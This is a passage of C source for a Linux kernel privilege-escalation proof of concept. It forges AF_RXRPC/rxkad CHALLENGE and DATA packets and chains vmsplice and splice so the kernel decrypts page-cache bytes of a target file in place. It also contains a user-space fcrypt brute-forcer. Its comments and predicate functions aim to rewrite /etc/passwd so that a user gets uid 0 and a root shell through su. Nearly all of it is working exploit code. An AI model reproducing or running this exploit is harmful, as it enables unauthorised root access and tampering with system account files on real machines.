 *   y = ntohl(enc[1]); cksum = (y >> 16) & 0xffff;  if zero -> 1
 */
static int compute_cksum(uint32_t cid, uint32_t call_id, uint32_t seq,
		const uint8_t key[8], const uint8_t csum_iv[8],
		uint16_t *cksum_out)
{
	int s = alg_open_pcbc_fcrypt(key);
	if (s < 0) return -1;
	uint32_t x = (cid & RXRPC_CHANNELMASK) << (32 - RXRPC_CIDSHIFT);
	x |= seq & 0x3fffffff;
	uint32_t in[2] = { htonl(call_id), htonl(x) };
	uint32_t out[2];
	int rc = alg_op(s, ALG_OP_ENCRYPT, csum_iv, in, 8, out);
	close(s);
	if (rc < 0) return -1;
	uint32_t y = ntohl(out[1]);
	uint16_t v = (y >> 16) & 0xffff;
	if (v == 0) v = 1;
	*cksum_out = v;
	return 0;
}

/* =================================================================== */
/* AF_RXRPC client                                                      */
/* =================================================================== */

static int setup_rxrpc_client(uint16_t local_port, const char *keyname)
{
	int fd = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
	if (fd < 0) { WARN("socket(AF_RXRPC client): %s", strerror(errno)); return -1; }
	if (setsockopt(fd, SOL_RXRPC, RXRPC_SECURITY_KEY,
				keyname, strlen(keyname)) < 0) {
		WARN("client SECURITY_KEY: %s", strerror(errno)); close(fd); return -1;
	}
	int min_level = RXRPC_SECURITY_AUTH;
	if (setsockopt(fd, SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL,
				&min_level, sizeof(min_level)) < 0) {
		WARN("client MIN_SECURITY_LEVEL: %s", strerror(errno));
		close(fd); return -1;
	}
	struct sockaddr_rxrpc srx = {0};
	srx.srx_family = AF_RXRPC;
	srx.srx_service = 0;
	srx.transport_type = SOCK_DGRAM;
	srx.transport_len = sizeof(struct sockaddr_in);
	srx.transport.sin.sin_family = AF_INET;
	srx.transport.sin.sin_port = htons(local_port);
	srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);
	if (bind(fd, (struct sockaddr *)&srx, sizeof(srx)) < 0) {
		WARN("client bind :%u: %s", local_port, strerror(errno));
		close(fd); return -1;
	}
	LOG("AF_RXRPC client bound :%u", local_port);
	return fd;
}

static int rxrpc_client_initiate_call(int cli_fd, uint16_t srv_port,
		uint16_t service_id,
		unsigned long user_call_id)
{
	char data[8] = "PINGPING";
	struct sockaddr_rxrpc srx = {0};
	srx.srx_family = AF_RXRPC;
	srx.srx_service = service_id;
	srx.transport_type = SOCK_DGRAM;
	srx.transport_len = sizeof(struct sockaddr_in);
	srx.transport.sin.sin_family = AF_INET;
	srx.transport.sin.sin_port = htons(srv_port);
	srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);

	char cmsg_buf[CMSG_SPACE(sizeof(unsigned long))];
	struct msghdr msg = {0};
	msg.msg_name = &srx; msg.msg_namelen = sizeof(srx);
	struct iovec iov = { .iov_base = data, .iov_len = sizeof(data) };
	msg.msg_iov = &iov; msg.msg_iovlen = 1;
	msg.msg_control = cmsg_buf; msg.msg_controllen = sizeof(cmsg_buf);
	struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_RXRPC;
	cmsg->cmsg_type = RXRPC_USER_CALL_ID;
	cmsg->cmsg_len = CMSG_LEN(sizeof(unsigned long));
	*(unsigned long *)CMSG_DATA(cmsg) = user_call_id;

	/* Don't block forever if no reply ever comes through this single sendmsg. */
	int fl = fcntl(cli_fd, F_GETFL);
	fcntl(cli_fd, F_SETFL, fl | O_NONBLOCK);

	ssize_t n = sendmsg(cli_fd, &msg, 0);
	fcntl(cli_fd, F_SETFL, fl);
	if (n < 0) {
		if (errno == EAGAIN || errno == EWOULDBLOCK) {
			LOG("client sendmsg returned EAGAIN (expected; kernel will keep "
					"retrying handshake)");
			return 0;
		}
		WARN("client sendmsg: %s", strerror(errno));
		return -1;
	}
	LOG("client sendmsg %zd B → :%u (handshake will follow asynchronously)",
			n, srv_port);
	return 0;
}

/* =================================================================== */
/* fake-server (plain UDP)                                              */
/* =================================================================== */

static int setup_udp_server(uint16_t port)
{
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0) { WARN("socket(udp server): %s", strerror(errno)); return -1; }
	struct sockaddr_in sa = {0};
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = htonl(0x7F000001);
	if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		WARN("udp server bind :%u: %s", port, strerror(errno));
		close(s); return -1;
	}
	LOG("plain UDP fake-server bound :%u", port);
	return s;
}

/* Receive one UDP datagram with timeout (ms). Returns bytes or -1. */
static ssize_t udp_recv_to(int s, void *buf, size_t cap,
		struct sockaddr_in *from, int timeout_ms)
{
	struct pollfd pfd = { .fd = s, .events = POLLIN };
	int rc = poll(&pfd, 1, timeout_ms);
	if (rc <= 0) return -1;
	socklen_t fl = from ? sizeof(*from) : 0;
	return recvfrom(s, buf, cap, 0,
			(struct sockaddr *)from, from ? &fl : NULL);
}

/* =================================================================== */
/* main PoC                                                             */
/* =================================================================== */

static int trigger_seq = 0;

static int do_one_trigger(int target_fd, off_t splice_off, size_t splice_len)
{
	char keyname[32];
	snprintf(keyname, sizeof(keyname), "evil%d", trigger_seq++);

	long key = add_rxrpc_key(keyname);
	if (key < 0) {
		if (trigger_seq < 5) WARN("add_rxrpc_key(%s): %s", keyname, strerror(errno));
		return -1;
	}

	/* Use varying ports so kernel TIME_WAIT / stale state does not bite. */
	uint16_t port_S = 7777 + (trigger_seq * 2 % 200);
	uint16_t port_C = port_S + 1;
	uint16_t svc_id = 1234;

	int udp_srv = setup_udp_server(port_S);
	if (udp_srv < 0) {
		if (trigger_seq < 5) WARN("setup_udp_server(%u) failed", port_S);
		syscall(SYS_keyctl, 3 /*KEYCTL_INVALIDATE*/, key); return -1;
	}

	int rxsk_cli = setup_rxrpc_client(port_C, keyname);
	if (rxsk_cli < 0) {
		if (trigger_seq < 5) WARN("setup_rxrpc_client(%u, %s) failed", port_C, keyname);
		close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
	}

	if (rxrpc_client_initiate_call(rxsk_cli, port_S, svc_id, 0xDEAD) < 0) {
		if (trigger_seq < 5) WARN("rxrpc_client_initiate_call failed");
		close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
	}

	uint8_t pkt[2048];
	struct sockaddr_in cli_addr;
	ssize_t n = udp_recv_to(udp_srv, pkt, sizeof(pkt), &cli_addr, 1500);
	if (n < (ssize_t)sizeof(struct rxrpc_wire_header)) {
		if (trigger_seq < 5) WARN("udp_recv_to: n=%zd errno=%s", n, strerror(errno));
		close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
	}
	struct rxrpc_wire_header *whdr_in = (struct rxrpc_wire_header *)pkt;
	uint32_t epoch  = ntohl(whdr_in->epoch);
	uint32_t cid    = ntohl(whdr_in->cid);
	uint32_t callN  = ntohl(whdr_in->callNumber);
	uint16_t svc_in = ntohs(whdr_in->serviceId);
	uint16_t cli_port = ntohs(cli_addr.sin_port);

	/* Send CHALLENGE */
	{
		struct {
			struct rxrpc_wire_header hdr;
			struct rxkad_challenge   ch;
		} __attribute__((packed)) c = {0};
		c.hdr.epoch = htonl(epoch);
		c.hdr.cid = htonl(cid);
		c.hdr.callNumber = 0; c.hdr.seq = 0;
		c.hdr.serial = htonl(0x10000);
		c.hdr.type = RXRPC_PACKET_TYPE_CHALLENGE;
		c.hdr.securityIndex = 2;
		c.hdr.serviceId = htons(svc_in);
		c.ch.version = htonl(2); c.ch.nonce = htonl(0xDEADBEEFu);
		c.ch.min_level = htonl(1);
		struct sockaddr_in to = { .sin_family=AF_INET, .sin_port=htons(cli_port),
			.sin_addr.s_addr=htonl(0x7F000001) };
		if (sendto(udp_srv, &c, sizeof(c), 0, (struct sockaddr*)&to, sizeof(to)) < 0) {
			close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
		}
	}

	/* Drain RESPONSE (best-effort) */
	for (int i = 0; i < 4; i++) {
		struct sockaddr_in src;
		if (udp_recv_to(udp_srv, pkt, sizeof(pkt), &src, 500) < 0) break;
	}

	/* csum + cksum with CURRENT SESSION_KEY */
	uint8_t csum_iv[8] = {0};
	if (compute_csum_iv(epoch, cid, 2, SESSION_KEY, csum_iv) < 0) {
		close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
	}
	uint16_t cksum_h = 0;
	if (compute_cksum(cid, callN, 1, SESSION_KEY, csum_iv, &cksum_h) < 0) {
		close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
	}

	/* Build malicious DATA header */
	struct rxrpc_wire_header mal = {0};
	mal.epoch = htonl(epoch);
	mal.cid = htonl(cid);
	mal.callNumber = htonl(callN);
	mal.seq = htonl(1);
	mal.serial = htonl(0x42000);
	mal.type = RXRPC_PACKET_TYPE_DATA;
	mal.flags = RXRPC_LAST_PACKET;
	mal.securityIndex = 2;
	mal.cksum = htons(cksum_h);
	mal.serviceId = htons(svc_in);

	/* connect udp_srv → client port for splice */
	struct sockaddr_in dst = { .sin_family=AF_INET, .sin_port=htons(cli_port),
		.sin_addr.s_addr=htonl(0x7F000001) };
	if (connect(udp_srv, (struct sockaddr*)&dst, sizeof(dst)) < 0) {
		close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
	}

	/* pipe + vmsplice header + splice file → pipe → udp_srv */
	int p[2];
	if (pipe(p) < 0) {
		close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
	}
	{
		struct iovec viv = { .iov_base = &mal, .iov_len = sizeof(mal) };
		if (vmsplice(p[1], &viv, 1, 0) < 0) goto trig_fail;
	}
	{
		loff_t off = splice_off;
		if (splice(target_fd, &off, p[1], NULL, splice_len, SPLICE_F_NONBLOCK) < 0)
			goto trig_fail;
	}
	if (splice(p[0], NULL, udp_srv, NULL, sizeof(mal) + splice_len, 0) < 0) {
		goto trig_fail;
	}
	close(p[0]); close(p[1]);

	/* recvmsg the malicious DATA into the kernel's verify_packet path */
	int fl = fcntl(rxsk_cli, F_GETFL);
	fcntl(rxsk_cli, F_SETFL, fl | O_NONBLOCK);
	for (int round = 0; round < 5; round++) {
		char rb[2048];
		struct sockaddr_rxrpc srx;
		char ccb[256];
		struct msghdr m = {0};
		struct iovec iv = { .iov_base = rb, .iov_len = sizeof(rb) };
		m.msg_name = &srx; m.msg_namelen = sizeof(srx);
		m.msg_iov = &iv;  m.msg_iovlen = 1;
		m.msg_control = ccb; m.msg_controllen = sizeof(ccb);
		ssize_t r = recvmsg(rxsk_cli, &m, 0);
		if (r > 0) break;
		if (errno == EAGAIN || errno == EWOULDBLOCK) usleep(20000);
		else break;
	}
	fcntl(rxsk_cli, F_SETFL, fl);

	close(rxsk_cli);
	close(udp_srv);
	syscall(SYS_keyctl, 3, key);
	return 0;

trig_fail:
	close(p[0]); close(p[1]);
	close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key);
	return -1;
}

/* ===================================================================
 * USER-SPACE pcbc(fcrypt) BRUTE-FORCE
 *
 * The kernel's rxkad_verify_packet_1() does an in-place 8-byte
 * pcbc(fcrypt) decrypt with iv=0 over the page-cache page at the splice
 * offset.  pcbc with single 8-B block and IV=0 reduces to a plain
 * fcrypt_decrypt(C, K).  We can therefore search for the right K
 * entirely in user-space — without touching the kernel/VM at all —
 * before applying ONE deterministic kernel trigger.
 *
 * Port of crypto/fcrypt.c from the kernel source (David Howells / KTH).
 * Verified against kernel test vectors:
 *   K=0,         decrypt(0E0900C73EF7ED41) = 00000000
 *   K=1144...66, decrypt(D8ED787477EC0680) = 123456789ABCDEF0
 * =================================================================== */

static const uint8_t fc_sbox0_raw[256] = {
	0xea, 0x7f, 0xb2, 0x64, 0x9d, 0xb0, 0xd9, 0x11, 0xcd, 0x86, 0x86, 0x91, 0x0a, 0xb2, 0x93, 0x06,
	0x0e, 0x06, 0xd2, 0x65, 0x73, 0xc5, 0x28, 0x60, 0xf2, 0x20, 0xb5, 0x38, 0x7e, 0xda, 0x9f, 0xe3,
	0xd2, 0xcf, 0xc4, 0x3c, 0x61, 0xff, 0x4a, 0x4a, 0x35, 0xac, 0xaa, 0x5f, 0x2b, 0xbb, 0xbc, 0x53,
	0x4e, 0x9d, 0x78, 0xa3, 0xdc, 0x09, 0x32, 0x10, 0xc6, 0x6f, 0x66, 0xd6, 0xab, 0xa9, 0xaf, 0xfd,
	0x3b, 0x95, 0xe8, 0x34, 0x9a, 0x81, 0x72, 0x80, 0x9c, 0xf3, 0xec, 0xda, 0x9f, 0x26, 0x76, 0x15,
	0x3e, 0x55, 0x4d, 0xde, 0x84, 0xee, 0xad, 0xc7, 0xf1, 0x6b, 0x3d, 0xd3, 0x04, 0x49, 0xaa, 0x24,
	0x0b, 0x8a, 0x83, 0xba, 0xfa, 0x85, 0xa0, 0xa8, 0xb1, 0xd4, 0x01, 0xd8, 0x70, 0x64, 0xf0, 0x51,
	0xd2, 0xc3, 0xa7, 0x75, 0x8c, 0xa5, 0x64, 0xef, 0x10, 0x4e, 0xb7, 0xc6, 0x61, 0x03, 0xeb, 0x44,
	0x3d, 0xe5, 0xb3, 0x5b, 0xae, 0xd5, 0xad, 0x1d, 0xfa, 0x5a, 0x1e, 0x33, 0xab, 0x93, 0xa2, 0xb7,
	0xe7, 0xa8, 0x45, 0xa4, 0xcd, 0x29, 0x63, 0x44, 0xb6, 0x69, 0x7e, 0x2e, 0x62, 0x03, 0xc8, 0xe0,
	0x17, 0xbb, 0xc7, 0xf3, 0x3f, 0x36, 0xba, 0x71, 0x8e, 0x97, 0x65, 0x60, 0x69, 0xb6, 0xf6, 0xe6,
	0x6e, 0xe0, 0x81, 0x59, 0xe8, 0xaf, 0xdd, 0x95, 0x22, 0x99, 0xfd, 0x63, 0x19, 0x74, 0x61, 0xb1,
	0xb6, 0x5b, 0xae, 0x54, 0xb3, 0x70, 0xff, 0xc6, 0x3b, 0x3e, 0xc1, 0xd7, 0xe1, 0x0e, 0x76, 0xe5,
	0x36, 0x4f, 0x59, 0xc7, 0x08, 0x6e, 0x82, 0xa6, 0x93, 0xc4, 0xaa, 0x26, 0x49, 0xe0, 0x21, 0x64,
	0x07, 0x9f, 0x64, 0x81, 0x9c, 0xbf, 0xf9, 0xd1, 0x43, 0xf8, 0xb6, 0xb9, 0xf1, 0x24, 0x75, 0x03,
	0xe4, 0xb0, 0x99, 0x46, 0x3d, 0xf5, 0xd1, 0x39, 0x72, 0x12, 0xf6, 0xba, 0x0c, 0x0d, 0x42, 0x2e,
};
static const uint8_t fc_sbox1_raw[256] = {
	0x77, 0x14, 0xa6, 0xfe, 0xb2, 0x5e, 0x8c, 0x3e, 0x67, 0x6c, 0xa1, 0x0d, 0xc2, 0xa2, 0xc1, 0x85,
	0x6c, 0x7b, 0x67, 0xc6, 0x23, 0xe3, 0xf2, 0x89, 0x50, 0x9c, 0x03, 0xb7, 0x73, 0xe6, 0xe1, 0x39,
	0x31, 0x2c, 0x27, 0x9f, 0xa5, 0x69, 0x44, 0xd6, 0x23, 0x83, 0x98, 0x7d, 0x3c, 0xb4, 0x2d, 0x99,
	0x1c, 0x1f, 0x8c, 0x20, 0x03, 0x7c, 0x5f, 0xad, 0xf4, 0xfa, 0x95, 0xca, 0x76, 0x44, 0xcd, 0xb6,
	0xb8, 0xa1, 0xa1, 0xbe, 0x9e, 0x54, 0x8f, 0x0b, 0x16, 0x74, 0x31, 0x8a, 0x23, 0x17, 0x04, 0xfa,
	0x79, 0x84, 0xb1, 0xf5, 0x13, 0xab, 0xb5, 0x2e, 0xaa, 0x0c, 0x60, 0x6b, 0x5b, 0xc4, 0x4b, 0xbc,
	0xe2, 0xaf, 0x45, 0x73, 0xfa, 0xc9, 0x49, 0xcd, 0x00, 0x92, 0x7d, 0x97, 0x7a, 0x18, 0x60, 0x3d,
	0xcf, 0x5b, 0xde, 0xc6, 0xe2, 0xe6, 0xbb, 0x8b, 0x06, 0xda, 0x08, 0x15, 0x1b, 0x88, 0x6a, 0x17,
	0x89, 0xd0, 0xa9, 0xc1, 0xc9, 0x70, 0x6b, 0xe5, 0x43, 0xf4, 0x68, 0xc8, 0xd3, 0x84, 0x28, 0x0a,
	0x52, 0x66, 0xa3, 0xca, 0xf2, 0xe3, 0x7f, 0x7a, 0x31, 0xf7, 0x88, 0x94, 0x5e, 0x9c, 0x63, 0xd5,
	0x24, 0x66, 0xfc, 0xb3, 0x57, 0x25, 0xbe, 0x89, 0x44, 0xc4, 0xe0, 0x8f, 0x23, 0x3c, 0x12, 0x52,
	0xf5, 0x1e, 0xf4, 0xcb, 0x18, 0x33, 0x1f, 0xf8, 0x69, 0x10, 0x9d, 0xd3, 0xf7, 0x28, 0xf8, 0x30,
	0x05, 0x5e, 0x32, 0xc0, 0xd5, 0x19, 0xbd, 0x45, 0x8b, 0x5b, 0xfd, 0xbc, 0xe2, 0x5c, 0xa9, 0x96,
	0xef, 0x70, 0xcf, 0xc2, 0x2a, 0xb3, 0x61, 0xad, 0x80, 0x48, 0x81, 0xb7, 0x1d, 0x43, 0xd9, 0xd7,
	0x45, 0xf0, 0xd8, 0x8a, 0x59, 0x7c, 0x57, 0xc1, 0x79, 0xc7, 0x34, 0xd6, 0x43, 0xdf, 0xe4, 0x78,
	0x16, 0x06, 0xda, 0x92, 0x76, 0x51, 0xe1, 0xd4, 0x70, 0x03, 0xe0, 0x2f, 0x96, 0x91, 0x82, 0x80,
};
static const uint8_t fc_sbox2_raw[256] = {
	0xf0, 0x37, 0x24, 0x53, 0x2a, 0x03, 0x83, 0x86, 0xd1, 0xec, 0x50, 0xf0, 0x42, 0x78, 0x2f, 0x6d,
	0xbf, 0x80, 0x87, 0x27, 0x95, 0xe2, 0xc5, 0x5d, 0xf9, 0x6f, 0xdb, 0xb4, 0x65, 0x6e, 0xe7, 0x24,
	0xc8, 0x1a, 0xbb, 0x49, 0xb5, 0x0a, 0x7d, 0xb9, 0xe8, 0xdc, 0xb7, 0xd9, 0x45, 0x20, 0x1b, 0xce,
	0x59, 0x9d, 0x6b, 0xbd, 0x0e, 0x8f, 0xa3, 0xa9, 0xbc, 0x74, 0xa6, 0xf6, 0x7f, 0x5f, 0xb1, 0x68,
	0x84, 0xbc, 0xa9, 0xfd, 0x55, 0x50, 0xe9, 0xb6, 0x13, 0x5e, 0x07, 0xb8, 0x95, 0x02, 0xc0, 0xd0,
	0x6a, 0x1a, 0x85, 0xbd, 0xb6, 0xfd, 0xfe, 0x17, 0x3f, 0x09, 0xa3, 0x8d, 0xfb, 0xed, 0xda, 0x1d,
	0x6d, 0x1c, 0x6c, 0x01, 0x5a, 0xe5, 0x71, 0x3e, 0x8b, 0x6b, 0xbe, 0x29, 0xeb, 0x12, 0x19, 0x34,
	0xcd, 0xb3, 0xbd, 0x35, 0xea, 0x4b, 0xd5, 0xae, 0x2a, 0x79, 0x5a, 0xa5, 0x32, 0x12, 0x7b, 0xdc,
	0x2c, 0xd0, 0x22, 0x4b, 0xb1, 0x85, 0x59, 0x80, 0xc0, 0x30, 0x9f, 0x73, 0xd3, 0x14, 0x48, 0x40,
	0x07, 0x2d, 0x8f, 0x80, 0x0f, 0xce, 0x0b, 0x5e, 0xb7, 0x5e, 0xac, 0x24, 0x94, 0x4a, 0x18, 0x15,
	0x05, 0xe8, 0x02, 0x77, 0xa9, 0xc7, 0x40, 0x45, 0x89, 0xd1, 0xea, 0xde, 0x0c, 0x79, 0x2a, 0x99,
	0x6c, 0x3e, 0x95, 0xdd, 0x8c, 0x7d, 0xad, 0x6f, 0xdc, 0xff, 0xfd, 0x62, 0x47, 0xb3, 0x21, 0x8a,
	0xec, 0x8e, 0x19, 0x18, 0xb4, 0x6e, 0x3d, 0xfd, 0x74, 0x54, 0x1e, 0x04, 0x85, 0xd8, 0xbc, 0x1f,
	0x56, 0xe7, 0x3a, 0x56, 0x67, 0xd6, 0xc8, 0xa5, 0xf3, 0x8e, 0xde, 0xae, 0x37, 0x49, 0xb7, 0xfa,
	0xc8, 0xf4, 0x1f, 0xe0, 0x2a, 0x9b, 0x15, 0xd1, 0x34, 0x0e, 0xb5, 0xe0, 0x44, 0x78, 0x84, 0x59,
	0x56, 0x68, 0x77, 0xa5, 0x14, 0x06, 0xf5, 0x2f, 0x8c, 0x8a, 0x73, 0x80, 0x76, 0xb4, 0x10, 0x86,
};
static const uint8_t fc_sbox3_raw[256] = {
	0xa9, 0x2a, 0x48, 0x51, 0x84, 0x7e, 0x49, 0xe2, 0xb5, 0xb7, 0x42, 0x33, 0x7d, 0x5d, 0xa6, 0x12,
	0x44, 0x48, 0x6d, 0x28, 0xaa, 0x20, 0x6d, 0x57, 0xd6, 0x6b, 0x5d, 0x72, 0xf0, 0x92, 0x5a, 0x1b,
	0x53, 0x80, 0x24, 0x70, 0x9a, 0xcc, 0xa7, 0x66, 0xa1, 0x01, 0xa5, 0x41, 0x97, 0x41, 0x31, 0x82,
	0xf1, 0x14, 0xcf, 0x53, 0x0d, 0xa0, 0x10, 0xcc, 0x2a, 0x7d, 0xd2, 0xbf, 0x4b, 0x1a, 0xdb, 0x16,
	0x47, 0xf6, 0x51, 0x36, 0xed, 0xf3, 0xb9, 0x1a, 0xa7, 0xdf, 0x29, 0x43, 0x01, 0x54, 0x70, 0xa4,
	0xbf, 0xd4, 0x0b, 0x53, 0x44, 0x60, 0x9e, 0x23, 0xa1, 0x18, 0x68, 0x4f, 0xf0, 0x2f, 0x82, 0xc2,
	0x2a, 0x41, 0xb2, 0x42, 0x0c, 0xed, 0x0c, 0x1d, 0x13, 0x3a, 0x3c, 0x6e, 0x35, 0xdc, 0x60, 0x65,
	0x85, 0xe9, 0x64, 0x02, 0x9a, 0x3f, 0x9f, 0x87, 0x96, 0xdf, 0xbe, 0xf2, 0xcb, 0xe5, 0x6c, 0xd4,
	0x5a, 0x83, 0xbf, 0x92, 0x1b, 0x94, 0x00, 0x42, 0xcf, 0x4b, 0x00, 0x75, 0xba, 0x8f, 0x76, 0x5f,
	0x5d, 0x3a, 0x4d, 0x09, 0x12, 0x08, 0x38, 0x95, 0x17, 0xe4, 0x01, 0x1d, 0x4c, 0xa9, 0xcc, 0x85,
	0x82, 0x4c, 0x9d, 0x2f, 0x3b, 0x66, 0xa1, 0x34, 0x10, 0xcd, 0x59, 0x89, 0xa5, 0x31, 0xcf, 0x05,
	0xc8, 0x84, 0xfa, 0xc7, 0xba, 0x4e, 0x8b, 0x1a, 0x19, 0xf1, 0xa1, 0x3b, 0x18, 0x12, 0x17, 0xb0,
	0x98, 0x8d, 0x0b, 0x23, 0xc3, 0x3a, 0x2d, 0x20, 0xdf, 0x13, 0xa0, 0xa8, 0x4c, 0x0d, 0x6c, 0x2f,
	0x47, 0x13, 0x13, 0x52, 0x1f, 0x2d, 0xf5, 0x79, 0x3d, 0xa2, 0x54, 0xbd, 0x69, 0xc8, 0x6b, 0xf3,
	0x05, 0x28, 0xf1, 0x16, 0x46, 0x40, 0xb0, 0x11, 0xd3, 0xb7, 0x95, 0x49, 0xcf, 0xc3, 0x1d, 0x8f,
	0xd8, 0xe1, 0x73, 0xdb, 0xad, 0xc8, 0xc9, 0xa9, 0xa1, 0xc2, 0xc5, 0xe3, 0xba, 0xfc, 0x0e, 0x25,
};

static uint32_t fc_sbox0[256], fc_sbox1[256], fc_sbox2[256], fc_sbox3[256];

#include <endian.h>

static void fcrypt_init_sboxes(void)
{
	for (int i = 0; i < 256; i++) {
		fc_sbox0[i] = htobe32((uint32_t)fc_sbox0_raw[i] << 3);
		fc_sbox1[i] = htobe32(((uint32_t)(fc_sbox1_raw[i] & 0x1f) << 27) |
				((uint32_t)fc_sbox1_raw[i] >> 5));
		fc_sbox2[i] = htobe32((uint32_t)fc_sbox2_raw[i] << 11);
		fc_sbox3[i] = htobe32((uint32_t)fc_sbox3_raw[i] << 19);
	}
}

#define fc_ror56_64(k, n) \
	(k = (k >> (n)) | ((k & ((1ULL << (n)) - 1)) << (56 - (n))))

typedef struct { uint32_t sched[16]; } fcrypt_uctx;

static void fcrypt_user_setkey(fcrypt_uctx *ctx, const uint8_t key[8])
{
	uint64_t k = 0;
	k  = (uint64_t)(key[0] >> 1);
	k <<= 7; k |= (uint64_t)(key[1] >> 1);
	k <<= 7; k |= (uint64_t)(key[2] >> 1);
	k <<= 7; k |= (uint64_t)(key[3] >> 1);
	k <<= 7; k |= (uint64_t)(key[4] >> 1);
	k <<= 7; k |= (uint64_t)(key[5] >> 1);
	k <<= 7; k |= (uint64_t)(key[6] >> 1);
	k <<= 7; k |= (uint64_t)(key[7] >> 1);

	ctx->sched[0x0] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0x1] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0x2] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0x3] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0x4] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0x5] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0x6] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0x7] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0x8] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0x9] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0xa] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0xb] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0xc] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0xd] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0xe] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0xf] = htobe32((uint32_t)k);
}

#define FC_F(R_, L_, sched_) do {                                        \
	union { uint32_t l; uint8_t c[4]; } u;                               \
	u.l = (sched_) ^ (R_);                                               \
	L_ ^= fc_sbox0[u.c[0]] ^ fc_sbox1[u.c[1]] ^                          \
	fc_sbox2[u.c[2]] ^ fc_sbox3[u.c[3]];                           \
} while (0)

static void fcrypt_user_decrypt(const fcrypt_uctx *ctx,
		uint8_t out[8], const uint8_t in[8])
{
	uint32_t L, R;
	memcpy(&L, in, 4);
	memcpy(&R, in + 4, 4);
	FC_F(L, R, ctx->sched[0xf]);
	FC_F(R, L, ctx->sched[0xe]);
	FC_F(L, R, ctx->sched[0xd]);
	FC_F(R, L, ctx->sched[0xc]);
	FC_F(L, R, ctx->sched[0xb]);
	FC_F(R, L, ctx->sched[0xa]);
	FC_F(L, R, ctx->sched[0x9]);
	FC_F(R, L, ctx->sched[0x8]);
	FC_F(L, R, ctx->sched[0x7]);
	FC_F(R, L, ctx->sched[0x6]);
	FC_F(L, R, ctx->sched[0x5]);
	FC_F(R, L, ctx->sched[0x4]);
	FC_F(L, R, ctx->sched[0x3]);
	FC_F(R, L, ctx->sched[0x2]);
	FC_F(L, R, ctx->sched[0x1]);
	FC_F(R, L, ctx->sched[0x0]);
	memcpy(out, &L, 4);
	memcpy(out + 4, &R, 4);
}

/* For the 2-splice chain we want the line to have EXACTLY 6 ':' and a
 * shell field that equals "/bin/bash" (in /etc/shells, valid path).
 * The two splices interlock as:
 *
 *   bytes 7..14  (offset 2800): P1 — sets uid=0, gid=1 digit, then
 *                4 random gecos-prefix bytes.
 *   bytes 15..22 (offset 2808): P2 — wipes the original ':' at line
 *                pos 16, preserves ':' at pos 21 and '/' at pos 22.
 *
 *   Combined line: "test:x:0:G:GGGGGGGGGG:/home/test:/bin/bash"
 *                   pos 0    8    21       32
 *
 *   pw_uid=0, pw_gid=G, pw_dir="/home/test", pw_shell="/bin/bash".
 *   Now `su -s /bin/bash test` proceeds through the restricted_shell()
 *   check (because /bin/bash IS in /etc/shells) and exec()s /bin/bash
 *   under uid=0.
 *
 * === 3-splice predicates ===
 *
 * After applying splices A, B, C in order to /etc/passwd line 1
 * (offsets 4, 6, 8 — each 8 bytes, last-write-wins), the final state
 * of chars 4..15 is determined by these P bytes:
 *
 *   char 4  = P_A[0]   want: ':'
 *   char 5  = P_A[1]   want: ':'
 *   char 6  = P_B[0]   want: '0'   (overwrites P_A[2])
 *   char 7  = P_B[1]   want: ':'   (overwrites P_A[3])
 *   char 8  = P_C[0]   want: '0'   (overwrites P_A[4]/P_B[2])
 *   char 9  = P_C[1]   want: ':'   (overwrites P_A[5]/P_B[3])
 *   char 10..14 = P_C[2..6]  want: any byte except ':' '\0' '\n'
 *   char 15 = P_C[7]   want: ':'
 *
 * The constraints on P_A[2..7] and P_B[2..7] are vacuous because they
 * are overwritten before /etc/passwd is read by anyone — we only care
 * about the final state. */
static inline int fc_check_pa_nullok(const uint8_t P[8])
{
	return P[0] == ':' && P[1] == ':';
}

static inline int fc_check_pb_nullok(const uint8_t P[8])
{
	return P[0] == '0' && P[1] == ':';
}

static inline int fc_check_pc_nullok(const uint8_t P[8])
{
	if (P[0] != '0') return 0;
	if (P[1] != ':') return 0;
	if (P[7] != ':') return 0;
	for (int i = 2; i < 7; i++) {
		if (P[i] == ':' || P[i] == '\0' || P[i] == '\n') return 0;
	}
	return 1;
}

static uint64_t fc_splitmix64(uint64_t *s)
{
	uint64_t z = (*s += 0x9E3779B97F4A7C15ULL);
	z = (z ^ (z >> 30)) * 0xBF58476D1CE4E5B9ULL;
	z = (z ^ (z >> 27)) * 0x94D049BB133111EBULL;
	return z ^ (z >> 31);
}

/* Generic brute-force.  `predicate` decides if a P is acceptable. */
typedef int (*pcheck_fn)(const uint8_t P[8]);

